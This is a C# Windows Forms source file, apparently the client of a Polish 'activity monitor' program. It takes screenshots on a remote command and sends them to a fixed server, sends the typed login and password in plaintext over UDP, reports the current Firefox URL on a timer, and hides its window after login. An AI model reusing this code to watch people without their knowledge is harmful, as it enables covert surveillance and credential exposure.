﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Net;
using System.IO;
using Activity_Monitor_Client;

namespace ZdalnyScreenshotKlient
{
    public partial class Form1 : Form
    {
        private int serwerKomendPort = 1978;
        private IPAddress serwerDanychIP = IPAddress.Parse("192.168.0.144");
        private int serwerDanychPort = 10000;
        private string adresLokalnyIP;
        private Bitmap obraz;
        private Processes procesy;

        Size nowyrozmiar = new Size(800, 450);
        przegladarki przegladarka = new przegladarki();

        public Form1()
        {
            InitializeComponent();

            IPHostEntry adresIP = Dns.GetHostEntry(Dns.GetHostName());
            adresLokalnyIP = adresIP.AddressList[1].ToString(); // TUTAJ WPISZ SWÓJ ADRES IP
            MessageBox.Show(adresLokalnyIP);
            backgroundWorker1.RunWorkerAsync();
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            WyslijWiadomoscUDP(adresLokalnyIP + ":HI");
            timer1.Start();
            //MessageBox.Show(adresLokalnyIP + ":HI");
        }

        private Bitmap wykonajScreenshot()
        {
            Bitmap bitmapa = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            Graphics screenshot = Graphics.FromImage(bitmapa);
            screenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bitmapa = zmien(bitmapa, nowyrozmiar);
            return bitmapa;
        }

        delegate void SetTextCallBack(string tekst);
        private void SetText(string tekst)
        {
            if (listBox1.InvokeRequired)
            {
                SetTextCallBack f = new SetTextCallBack(SetText);
                this.Invoke(f, new object[] { tekst });
            }
            else
            {
                this.listBox1.Items.Add(tekst);
            }
        }

        public Bitmap zmien(Bitmap imgToResize, Size size)
        {
            Bitmap bitmap = new Bitmap(size.Width, size.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.DrawImage(imgToResize, 0, 0, size.Width, size.Height);
            }
            return bitmap;
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            TcpListener serwer = new TcpListener(IPAddress.Parse(adresLokalnyIP), serwerKomendPort);
            serwer.Start();
            this.SetText("Oczekuje na komendy...");
            while (true)
            {
                try
                {
                TcpClient klientKomend = serwer.AcceptTcpClient();
                this.SetText("Otrzymano komende.");
                NetworkStream ns = klientKomend.GetStream();
                Byte[] bufor = new Byte[5];
                int odczyt = ns.Read(bufor, 0, bufor.Length);
                String s = Encoding.ASCII.GetString(bufor);
                string wiadomosc = Encoding.ASCII.GetString(bufor);
                if (wiadomosc == "##S##")
                {
                    this.SetText("Zrzut ekranu w trakcie wykonywania ...");
                    obraz = wykonajScreenshot();
                    MemoryStream ms = new MemoryStream();
                    obraz.Save(ms, ImageFormat.Jpeg);
                    byte[] obrazByte = ms.GetBuffer();
                    ms.Close();
                    try
                    {
                        TcpClient klient2 = new TcpClient(serwerDanychIP.ToString(), serwerDanychPort);
                        NetworkStream ns2 = klient2.GetStream();
                        this.SetText("Wysyłanie zrzutu ...");
                        using (BinaryWriter bw = new BinaryWriter(ns2))
                        {
                            bw.Write((int)obrazByte.Length);
                            bw.Write(obrazByte);
                        }
                        this.SetText("Zrzut ekranu przesłany");
                    }
                    catch (Exception ex)
                    {
                        this.SetText("Nie można połączyć z serwerem");
                    }
                }
                if (wiadomosc == "##Y##")
                {
                    MessageBox.Show("autoryzacja");
                }
                }
                catch {}
            }
        }

        private void WyslijWiadomoscUDP(string wiadomosc)
        {
            UdpClient klient = new UdpClient(serwerDanychIP.ToString(), 43210);
            byte[] bufor = Encoding.ASCII.GetBytes(wiadomosc);
            klient.Send(bufor, bufor.Length);
            klient.Close();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            WyslijWiadomoscUDP(adresLokalnyIP + ":BYE");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string [] proc = Processes.getProcesses();
            foreach (string proces in proc)
            {
                listBox2.Items.Add(proces);
            }
            //WyslijWiadomoscUDP(adresLokalnyIP + ":STRING:" + tb_wiadomosc.Text);
        }

        bool logowanie = true;

        private void b_loguj_Click(object sender, EventArgs e)
        {
            WyslijWiadomoscUDP(adresLokalnyIP + ":LOGIN:" + tb_login.Text + ":" + tb_haslo.Text);
            
            notifyIcon1.Visible = true;
            notifyIcon1.Text = "Program Minimalizujący";
            notifyIcon1.Icon = this.Icon;
            notifyIcon1.ContextMenuStrip = contextMenuStrip1;
            this.ShowInTaskbar = false;
            this.Visible = false;
            logowanie = false;
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!logowanie)
                WyslijWiadomoscUDP(adresLokalnyIP + ":URL:" + przegladarka.GetBrowserFirefox());
            else
                logowanie = false;
        }

        private readonly Random getrandom = new Random();
        private readonly object syncLock = new object();

        public int GetRandomNumber(int min, int max)
        {
            lock (syncLock)
            { // synchronize
                return getrandom.Next(min, max);
            }
        }

        public void delay(int sekundy1, int sekundy2)
        {
            int sekundy = GetRandomNumber(sekundy1, sekundy2);

            for (int i = 0; i < sekundy * 2000000; i++)
            {
                Application.DoEvents(); // rekakcja na guzik
            }
        }

        private void zamknijToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WyslijWiadomoscUDP(adresLokalnyIP + ":BYE");
            this.Close();
        }
    }
}
